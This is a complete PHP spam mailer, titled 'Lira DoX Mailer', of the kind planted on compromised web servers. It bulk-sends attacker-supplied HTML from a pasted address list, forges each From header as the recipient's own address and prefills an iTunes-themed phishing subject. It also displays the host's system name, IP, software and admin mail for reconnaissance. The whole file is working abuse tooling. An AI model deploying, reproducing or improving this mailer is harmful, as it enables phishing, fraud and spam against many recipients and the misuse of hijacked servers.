<?php
@session_start();
@set_time_limit(0);
$testa = $_POST['veio'];
if($testa != "") {
$message = $_POST['html'];
$subject = $_POST['assunto'];
$nome = $_POST['nome'];
$de = $_POST['de'];
$to = $_POST['emails'];
$email = explode("\n", $to);
$message = stripslashes($message);
$i = 0;
$count = 1;
while($email[$i]) {
$ok = "ok";
$headers  = "MIME-Version: 1.0\n";
$headers .= "Content-Type: text/html; charset=UTF-8
Content-Transfer-Encoding: 7bit
X-Mailer: EDMAIL R6.00.02
Content-Length: 41061\n";
$headers .= "From: ".$email[$i]."\r\n";
if(mail($email[$i], $subject, $message, $headers))
echo "<font color=gren>* N&#1098;mero: $count <b>".$email[$i]."</b> <font color=gren>Sent....!</font><br><hr>";
else
echo "<font color=red>* N&#1098;mero: $count <b>".$email[$i]."</b> <font color=red>Error in Sending ??</font><br><hr>";
$i++;
$count++;
}
$count--;
if($ok == "ok")
echo ""; 
}
?>
<html>
<head>
<title>Lira DoX Mailer</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<style>
body {
    margin-left: 0;
    margin-right: 0;
    margin-top: 0;
        background-color: #000000;
    margin-bottom: 0;
}
.titulo {
    font-family: Arial, Helvetica, sans-serif;
    font-size: 70px;
    color: #1BF51F;
    font-weight: bold;
}
.normal {
    font-family: Arial, Helvetica, sans-serif;
    font-size: 12px;
    color: #1BF51F;
}
.form {
    font-family: Arial, Helvetica, sans-serif;
    font-size: 10px;
    color: #FFFFFF;
    background-color: #000000;
    border: 1px dashed #666666;
}
.texto {
    font-family: Verdana, Arial, Helvetica, sans-serif;
    font-weight: bold;
}
.alerta {
    font-family: Verdana, Arial, Helvetica, sans-serif;
    font-weight: bold;
    color: #990000;
    font-size: 10px;
}
</style>
</head>
<body>
<form action="" method="post" enctype="multipart/form-data" name="form1">
  <input type="hidden" name="veio" value="sim">
    <tr>
 
<table border="0" width="53%" bordercolorlight="#000000" bordercolordark="#000000" style="border: 1px ridge #1BF51F" bgcolor="black" > 
     <td width="462" height="25" align="center" bgcolor="#000000"><span class="titulo">lira DoX</span></td>
<tr align="left"> 
<td colspan="2" ><font color="#1BF51F">
Server Name: <?php echo $UNAME = @php_uname(); ?><br>
System: <?php echo $OS = @PHP_OS; ?><br>
Server IP: <?php echo $_SERVER['SERVER_ADDR']; ?><br>
Software : <?php echo $_SERVER['SERVER_SOFTWARE']; ?><br>
Admin Mail: <?php echo $_SERVER['SERVER_ADMIN']; ?> <br>
Safe Mode: <?php echo $safe_mode = @ini_get('safe_mode'); ?>
</td>
</center>
    </tr>
    <tr>
      <td height="194" valign="top" bgcolor="#000000">
          <table width="100%"  border="0" cellpadding="0" cellspacing="5" class="normal" height="444">
          <tr>
            <td align="right" height="17"><span class="texto">Subject:</span></td>
            <td height="17"><input name="assunto" type="text" value="[itunes] :attention"class="form" id="assunto" style="width:100%" ></td>
          </tr>
          <tr align="center" bgcolor="#99CCFF">
            <td height="20" colspan="2" bgcolor="#000000"><span class="texto">lira DoX Mailer</span></td>
          </tr>
          <tr align="right">
            <td height="146" colspan="2" valign="top"><br>
             <textarea name="html" style="width:100%" rows="8" wrap="VIRTUAL" class="form" id="html">
</textarea>
              <span class="alerta">*Lettre: hat lettre hna </span></td>
        </tr>
          <tr align="center" bgcolor="#000000">
            <td height="10" colspan="2"><span class="texto">Mailing List</span>
             
          </tr>
          <tr align="right">
            <td height="136" colspan="2" valign="top"><br>
              <textarea name="emails" style="width:100%" rows="8" wrap="VIRTUAL" class="form" id="emails">
</textarea
              <span class="alerta">* Mail List</span> </td>
          </tr>
          <tr>
            <td height="26" align="right" valign="top" colspan="2"><input type="submit" name="Submit" value="bismi laaaaaah"></td>
          </tr>
        </table>
      </td>
    </tr>
    <tr>
      <td height="15" align="center" bgcolor="#000000">&nbsp;</td>
    </tr>
  </table>
</form>
</body>